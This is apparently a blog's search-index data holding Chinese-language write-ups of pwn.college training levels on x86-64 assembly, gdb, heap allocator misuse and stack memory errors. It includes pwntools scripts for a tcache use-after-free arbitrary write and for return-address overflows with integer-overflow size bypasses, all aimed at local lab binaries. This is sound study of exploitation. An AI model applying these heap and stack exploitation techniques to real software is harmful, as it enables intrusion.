noprefix</span><br><span class=\"line\">    .global _start</span><br><span class=\"line\">    _start :</span><br><span class=\"line\">        mov rdi, 0x1337</span><br></pre></td></tr></table></figure>\n<p>但是可以直接用pwntools传输<code>mov rdi, 0x1337</code>这一句。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python3</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> pwn</span><br><span class=\"line\">pwn.context.log_level = <span class=\"string\">&quot;INFO&quot;</span></span><br><span class=\"line\">pwn.context.encoding = <span class=\"string\">&quot;latin&quot;</span></span><br><span class=\"line\">pwn.context.arch = <span class=\"string\">&quot;amd64&quot;</span></span><br><span class=\"line\">pwn.warnings.simplefilter(<span class=\"string\">&quot;ignore&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">assembly = <span class=\"string\">&quot;&quot;&quot;mov rdi, 0x1337&quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">proc = pwn.process(<span class=\"string\">&quot;/challenge/embryoasm_level1&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(proc.readrepeat(<span class=\"number\">1</span>).decode())</span><br><span class=\"line\">proc.send(pwn.asm(assembly))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(proc.readrepeat(<span class=\"number\">1</span>).decode())</span><br></pre></td></tr></table></figure>\n<p>一个好用的exp，可以直接在非根目录下执行。</p>\n<h4><span id=\"level2\">Level2</span></h4><p><code>add rdi, 0x331337</code></p>\n<h4><span id=\"level3\">Level3</span></h4><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-01-30%20%E4%B8%8A%E5%8D%8811.38.12.png\" alt=\"截屏2022-01-30 上午11.38.12\"></p>\n<p>出师未捷身先死。</p>\n<p>这里应该是对于汇编乘法对于寄存器的改变不太清楚<img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-01-30%20%E4%B8%8A%E5%8D%8811.48.15.png\" alt=\"截屏2022-01-30 上午11.48.15\"></p>\n<p>​        问题出在64位乘法会产生128位乘积，储存在<code>rdx:rax</code>中由于题目给的都是低32位的所以高32位全部是0，相当于<code>mul</code>之后<code>rdx</code>就变成了0，自然拿不到flag。</p>\n<h4><span id=\"level4\">Level4</span></h4><p>​        简单的64位汇编除法。相关的指令都已经给出了，抄作业就行。</p>\n<h4><span id=\"level5\">Level5</span></h4><p>​        依然是简单的除法，涉及到余数的处理。既然余数存在<code>rdx</code>，<code>mov rax，rdx</code>就行。</p>\n<h4><span id=\"level6\">Level6</span></h4><p>​        对于低位的数字运算（好烦），</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">rax = rdi modulo 256 \t\t\t;2^8</span><br><span class=\"line\">rbx = rsi module 65536\t\t;2^16</span><br></pre></td></tr></table></figure>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-01-30%20%E4%B8%8B%E5%8D%882.47.33.png\" alt=\"截屏2022-01-30 下午2.47.33\"></p>\n<p>所以edi和esi没有低八位吗？</p>\n<p>可能是吧，就像正常来说ebp和esp也没有低八位。</p>\n<h4><span id=\"level7\">Level7</span></h4><p>​        进行移位操作的练习，需要让rax为rdi的b3位的值</p>\n<p>​        </p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-01-30%20%E4%B8%8B%E5%8D%883.37.16.png\" alt=\"截屏2022-01-30 下午3.37.16\"></p>\n<h4><span id=\"level8\">Level8</span></h4><p>​        与操作。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-01-30%20%E4%B8%8B%E5%8D%883.46.06.png\" alt=\"截屏2022-01-30 下午3.46.06\"></p>\n<h4><span id=\"level9\">Level9</span></h4><p>​        简单的奇偶判断，rax应该是1与rdi lsb异或后的结果。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-01-30%20%E4%B8%8B%E5%8D%885.13.57.png\" alt=\"截屏2022-01-30 下午5.13.57\"></p>\n<h4><span id=\"level10\">Level10</span></h4><p>​        简单的间接寻址。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-01-30%20%E4%B8%8B%E5%8D%885.33.10.png\" alt=\"截屏2022-01-30 下午5.33.10\"></p>\n<p>​            要注意的是这里面有一些规范，大概就是不能<code>mov [register],number;</code>。也就是说涉及到寄存器间接寻址的操作都不能用立即数，而是需要利用寄存器。</p>\n<h4><span id=\"level11\">Level11</span></h4><p>​        涉及对byte，word ，dword和qword的size的理解。<img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-01-30%20%E4%B8%8B%E5%8D%885.42.02.png\" alt=\"截屏2022-01-30 下午5.42.02\"></p>\n<h4><span id=\"level12\">Level12</span></h4><p>​        <del>我发现这个东西最恼人的不是做本身而是看题，不想看题好烦，题好长。但是只看问题又不能瞬间找到思路。。。</del></p>\n<p>​        考点是利用寄存器间接寻址设置寄存器的值为指定值。<del>（本来以为要考虑小端序造成的影响但其实不用考虑）</del></p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-01-30%20%E4%B8%8B%E5%8D%885.52.50.png\" alt=\"截屏2022-01-30 下午5.52.50\"></p>\n<h4><span id=\"level13\">Level13</span></h4><p>​        也就是一个按照地址偏移寻址的方式的理解。（基址寻址）</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-01-30%20%E4%B8%8B%E5%8D%889.46.14.png\" alt=\"截屏2022-01-30 下午9.46.14\"></p>\n<h4><span id=\"level14\">Level14</span></h4><p>​        对于出入栈相关指令的简单理解。</p>\n<p>​        做题的时候卡了一下，因为没有正确理解题意，我以为是需要把栈顶值减去rdi后的值存到rax中就行，但是题意其实是让我们改变栈顶的值，所以我们将rax取出减rdi后还需要push回去。（还是吃了英语不好的亏捏）</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-01-30%20%E4%B8%8B%E5%8D%8810.11.05.png\" alt=\"截屏2022-01-30 下午10.11.05\"></p>\n<p>​        </p>\n<h4><span id=\"level15\">Level15</span></h4><p>​        还是围绕栈的先入后出的练习。</p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-01-30%20%E4%B8%8B%E5%8D%8810.19.15.png\" alt=\"截屏2022-01-30 下午10.19.15\"></p>\n<p>​            </p>\n<h4><span id=\"level16\">Level16</span></h4><p>​        利用rsp来寻址。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-01-30%20%E4%B8%8B%E5%8D%8810.36.37.png\" alt=\"截屏2022-01-30 下午10.36.37\"></p>\n<p>​        </p>\n<p>​        这里我把rdx清零了，属于是多此一举。</p>\n<h4><span id=\"level17\">Level17</span></h4><p>​        这题干怎么越来越长。</p>\n<p>​        等会儿再做。</p>\n<p>​</p>\n","categories":["Binary_security"],"tags":["pwncollege"]},{"title":"Debugging Refresher","url":"/2022/02/14/pwn.college_Debugging%20Refresher/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-FafVeXCP\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div> \n<h4><span id=\"level1\">Level1</span></h4><p>​        直接r，然后c到断点。</p>\n<h4><span id=\"level2\">Level2</span></h4><p>​        <code>p/x $r12</code></p>\n<h4><span id=\"level3\">Level3</span></h4><p>​        不好描述，可以根据后面的正确随机数在栈中找到对应的位置，然后重新执行并输入。</p>\n<h4><span id=\"level4\">Level4</span></h4><p>​        。。。。</p>\n<h4><span id=\"level5\">Level5</span></h4><p>gdb脚本。</p>\n","categories":["Binary_security"],"tags":["pwncollege"]},{"title":"Dynamic_Allocator_Misuse","url":"/2022/04/01/pwn.college_Dynamic_Allocator_Misuse/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-wzPmZcyj\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"1844479015\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div>  \n<h4><span id=\"level1\">Level1</span></h4><p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-30%20%E4%B8%8B%E5%8D%887.39.05.png\" alt=\"截屏2022-03-30 下午7.39.05\"></p>\n<p>​        开门绿，你从未拥有过的全新体验（</p>\n<p>​        给出了增删查以及load flag的四个功能，free有uaf，纯纯的uaf啊。</p>\n<p>​        直接malloc flag_chunk_size，free，然后load flag，flag chunk被load在chunk0内存空间，然后puts就行。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-30%20%E4%B8%8B%E5%8D%887.42.01.png\" alt=\"截屏2022-03-30 下午7.42.01\"></p>\n<h4><span id=\"level11\">Level1.1</span></h4><p>​        故技重施。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-30%20%E4%B8%8B%E5%8D%887.47.45.png\" alt=\"截屏2022-03-30 下午7.47.45\"></p>\n<h4><span id=\"level20\">Level2.0</span></h4><p>​        做法和楼上完全一致，但是程序逻辑其实是不一样的，详见level2.1。</p>\n<h4><span id=\"level21\">Level2.1</span></h4><p>​        level2和1的差别就是load flag并不是使用固定的size，而是随机数，在2.0我们可以看到flag chunk的size，但是2.1不行，所以需要想办法绕过。</p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-30%20%E4%B8%8B%E5%8D%888.00.23.png\" alt=\"截屏2022-03-30 下午8.00.23\"></p>\n<p>​        一个128 ～ 999的随机数。</p>\n<p>​        所以绕过的思路也非常之简单，只需要malloc的chunk size大于999+0x8就行。我随便malloc了1200，亲测有效。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-30%20%E4%B8%8B%E5%8D%888.07.05.png\" alt=\"截屏2022-03-30 下午8.07.05\"></p>\n<p>​        </p>\n<h4><span id=\"level30\">Level3.0</span></h4><p>连续malloc 两个832sizechunk，然后依次free chunk1    和chunk0。再read flag，puts chunk1。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-30%20%E4%B8%8B%E5%8D%888.27.56.png\" alt=\"截屏2022-03-30 下午8.27.56\"></p>\n<h4><span id=\"level31\">Level3.1</span></h4><p>​        一样。</p>\n<h4><span id=\"level40\">Level4.0</span></h4><p>​        （这个不会是level3的随机数版吧。。。。</p>\n<p>还好，不是）</p>\n<p>​        我才意识到它那个read two times其实会覆盖第一次read的内容，所以puts的话是要write 第二次read的flag。</p>\n<p>​        回到题本身，多出一个scanf的功能，应该是希望我们修改fd。话说这个是真的不走寻常路，一上来就整tcache。但是也能理解，tcache和fastbin在这种等级上的利用难度其实差不多。</p>\n<p>​        程序依旧是可以uaf，malloc flag chunk size，free掉，然后edit fd，使其指向flag chunk，下一次malloc就会分配flag chunk的空间。也就是能够将flag puts出来，但是有个问题就是，如果直接输入fd的覆盖的话似乎是没有办法转换成字节流的，我又懒得写脚本，怎么搞呢。能跳过这道题吗。</p>\n<p>​        能*v*</p>\n<h4><span id=\"level50\">Level5.0</span></h4><p>​        感觉前面的level没啥好做的。                </p>\n<p>​        可以add 最多16个chunk，多了一个puts_flag功能，大致就是只要flag ptr指向的地方不为0就能打印flag。但是程序并没有给我们提供覆盖内存的功能。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt;= <span class=\"number\">0</span>; ++i )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[*] flag_buffer = malloc(%d)\\n&quot;</span>, <span class=\"number\">432LL</span>);</span><br><span class=\"line\">        size_4 = (<span class=\"keyword\">const</span> <span class=\"keyword\">char</span> *)<span class=\"built_in\">malloc</span>(<span class=\"number\">0x1B0</span>uLL);</span><br><span class=\"line\">        *(_QWORD *)size_4 = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[*] flag_buffer = %p\\n&quot;</span>, size_4);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      v3 = open(<span class=\"string\">&quot;/flag&quot;</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">      read(v3, (<span class=\"keyword\">void</span> *)(size_4 + <span class=\"number\">16</span>), <span class=\"number\">0x80</span>uLL);</span><br><span class=\"line\">      <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;[*] read the flag!&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( <span class=\"built_in\">strcmp</span>(s1, <span class=\"string\">&quot;puts_flag&quot;</span>) )</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( *(_QWORD *)size_4 )</span><br><span class=\"line\">      <span class=\"built_in\">puts</span>(size_4 + <span class=\"number\">16</span>);</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">      <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Not authorized!&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br></pre></td></tr></table></figure>\n<p>​        flag 是在flag ptr + 16    的地方读入的，但是需要让flag_ptr +不为0， 并没有任何输入的方法的话，只能通过构造chunk的meta datd了。不过其实我不理解，flag已经被load进了idx0，为什么puts出来是空字节…大概是因为flag是在ptr+16的地方读入，前面的字符都是<code>\\x00</code>，所以还是需要覆盖flag ptr首字节为自然数，然后通过<code>puts_flag</code>拿flag。</p>\n<p>​        但是这个思路感觉行不通，因为每次load flag之后都会把ptr首字节置0，所以有了另外一种思路就是在ptr+16的地方伪造idx。也就是需要使一个idx指向ptr+16。</p>\n<h4><span id=\"level6\">Level6</span></h4><p>​        输入的flag与0x42554b处八个字符相等即可拿flag，但是这个地址处的字符显然需要我们自己覆盖。所以思路是利用uaf构造任意地址写。但是又有scanf。这下不得不写脚本了。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-01%20%E4%B8%8B%E5%8D%887.55.48.png\" alt=\"截屏2022-04-01 下午7.55.48\"></p>\n<p>蚌埠住了。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"></span><br><span class=\"line\">p = process(<span class=\"string\">&quot;/challenge/babyheap_level6.0&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#p = process(&quot;./babyheap_level6.0&quot;)</span></span><br><span class=\"line\"></span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">context.log_level = <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">target_addr = <span class=\"number\">0x42554B</span> - <span class=\"number\">0x10</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span>(<span class=\"params\">idx,size</span>):</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;:&quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">b&quot;malloc&quot;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;Index: &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;Size: &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">free</span>(<span class=\"params\">idx</span>):</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;:&quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&quot;free&quot;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;Index: &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">puts</span>():</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;:&quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&quot;puts&quot;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;Index: &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">edit</span>(<span class=\"params\">idx,content</span>):</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;:&quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&quot;scanf&quot;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;Index: &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;\\n&quot;</span>)</span><br><span class=\"line\">\tp.sendline(content)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0</span>,<span class=\"number\">40</span>)<span class=\"comment\">#chunk0</span></span><br><span class=\"line\">free(<span class=\"number\">0</span>)<span class=\"comment\">#bin0</span></span><br><span class=\"line\">payload = p64(target_addr)*<span class=\"number\">2</span></span><br><span class=\"line\">edit(<span class=\"number\">0</span>,payload)</span><br><span class=\"line\">gdb.attach(p)</span><br><span class=\"line\">add(<span class=\"number\">0</span>,<span class=\"number\">40</span>)<span class=\"comment\">#point to target_addr</span></span><br><span class=\"line\">edit(<span class=\"number\">0</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">40</span>)</span><br><span class=\"line\">add(<span class=\"number\">1</span>,<span class=\"number\">40</span>)<span class=\"comment\">#point to target_addr</span></span><br><span class=\"line\">edit(<span class=\"number\">1</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">40</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;:&quot;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">b&quot;send_flag&quot;</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Secret: &quot;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h4><span id=\"level7\">Level7</span></h4><p>​        level6的随机数版，建议别做，折寿。</p>\n<h4><span id=\"level8\">Level8</span></h4><h4><span id><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-01%20%E4%B8%8B%E5%8D%888.19.24.png\" alt=\"截屏2022-04-01 下午8.19.24\"></span></h4><p>​        fd的target addt开头是换行符，但是无所谓，直接申请0x426701-0x10就行，下一道。</p>\n<h4><span id=\"level9\">Level9</span></h4><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-01%20%E4%B8%8B%E5%8D%888.22.39.png\" alt=\"截屏2022-04-01 下午8.22.39\"></p>\n<p>​</p>\n","categories":["Binary_security"],"tags":["pwncollege"]},{"title":"MemoryErrors","url":"/2022/03/03/pwn.college_MemoryErrors/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-rydklQzc\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div> \n<p>​        视频主要介绍了栈溢出及其保护。保护的绕过包括canary和pie，并没有提到NX（那个似乎在后面一个module）</p>\n<p>​        传输题目到本地可以使用<code>scp</code>命令。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">scp -i key -r hacker@dojo.pwn.college:/challenge/babymem_level4.1 /Users/rin/ctf/pwn/pwn_college/MemoryErrors</span><br></pre></td></tr></table></figure>\n<h4><span id=\"level10\">Level1.0</span></h4><p>​        随便溢，覆盖掉变量就行。</p>\n<h4><span id=\"level11\">Level1.1</span></h4><p>​        随便溢。</p>\n<h4><span id=\"level20\">Level2..0</span></h4><p>​        随便溢。</p>\n<h4><span id=\"level21\">level2.1</span></h4><p>​        这道题理论上也是需要溢出到v9，但是很奇怪。多试几次会发现溢出得足够大的时候就会有flag了，这里溢出0x1000个就行。</p>\n<p>​        关于为什么要溢出那么多：我找了很久也没有找到第二次输入的时候缓冲区的地址，大概是利用到了堆内存。</p>\n<h4><span id=\"level30\">Level3.0</span></h4><p>​        没啥好说的。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"></span><br><span class=\"line\">p = process(<span class=\"string\">&quot;/challenge/babymem_level3.0&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">win_addr = <span class=\"number\">0x4019fa</span></span><br><span class=\"line\">payload = <span class=\"string\">&quot;a&quot;</span>*<span class=\"number\">152</span> + p64(win_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Payload size:&quot;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">&quot;160&quot;</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;!&quot;</span>)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.recv()</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>​        </p>\n<h4><span id=\"level31\">Level3.1</span></h4><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class=\"line\">context.log_level = <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"><span class=\"comment\">#p = process(&quot;./babymem_level3.1&quot;)</span></span><br><span class=\"line\">p = process(<span class=\"string\">&quot;/challenge/babymem_level3.1&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">win_addr = <span class=\"number\">0x401D35</span></span><br><span class=\"line\">payload = <span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">105</span> + p64(win_addr)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">p.send(<span class=\"string\">b&quot;115&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p)</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>​            </p>\n<p>为什么偏移量这么难找。</p>\n<h4><span id=\"level40\">Level4.0</span></h4><p>​        这个题也是蛮灵性的，只能最多输入18个字符但是溢出量是40。</p>\n<p>​        注意到实际上程序对于第一次输入的size是没有很严格检测的，所以我们可以输入任意小于18的数字，比如负数。并且负责控制输入size的实际上是一个无符号整数。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-05%20%E4%B8%8A%E5%8D%8810.16.03.png\" alt=\"截屏2022-03-05 上午10.16.03\"></p>\n<p>对于int型的负数强制类型转换，使得实际能输入的size变得非常大。所以这里其实相当于构建了一个整数溢出，然后绕过了size后面就比较常规了。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class=\"line\"><span class=\"comment\">#context.log_level = &quot;debug&quot;</span></span><br><span class=\"line\"><span class=\"comment\">#p = process(&quot;./babymem_level4.0&quot;)</span></span><br><span class=\"line\">p = process(<span class=\"string\">&quot;/challenge/babymem_level4.0&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#pad = 0x401B5 #0x30</span></span><br><span class=\"line\">win_addr = <span class=\"number\">0x401B88</span></span><br><span class=\"line\">payload = <span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">40</span>+ p64(win_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(<span class=\"string\">b&quot;-999&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p)</span></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>​        </p>\n<h4><span id=\"level41\">Level4.1</span></h4><p>​        漏洞点：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ( (<span class=\"keyword\">signed</span> <span class=\"keyword\">int</span>)v5 &gt; <span class=\"number\">30</span> )</span><br></pre></td></tr></table></figure>\n<p>​        依然是利用强制类型转换将本来是uint的v5变成int来与30比较，形成整数溢出。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class=\"line\"><span class=\"comment\">#context.log_level = &quot;debug&quot;</span></span><br><span class=\"line\"><span class=\"comment\">#p = process(&quot;./babymem_level4.1&quot;)</span></span><br><span class=\"line\">p = process(<span class=\"string\">&quot;/challenge/babymem_level4.1&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#pad = 0x401B5 #0x30</span></span><br><span class=\"line\">win_addr = <span class=\"number\">0x4016A3</span></span><br><span class=\"line\">payload = <span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">56</span>+ p64(win_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(<span class=\"string\">b&quot;-999&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p)</span></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h4><span id=\"level50\">Level5.0</span></h4><p>​        这个题依然是在输入size的地方进行了一定的检测，这里是</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ( v31 * v32 &gt; <span class=\"number\">7</span> )</span><br><span class=\"line\">    sub_401150(<span class=\"string\">&quot;record_size * record_num &lt; (unsigned int) sizeof(input)&quot;</span>, <span class=\"string\">&quot;&lt;stdin&gt;&quot;</span>, <span class=\"number\">143LL</span>, <span class=\"string\">&quot;challenge&quot;</span>);</span><br></pre></td></tr></table></figure>\n<p>​    </p>\n<p>​        然后虽然可以输入负数，但是如果随便输的话会导致溢出到下一个payload的read的buffer，导致输入不了，程序直接爆炸。真的非常逆天。        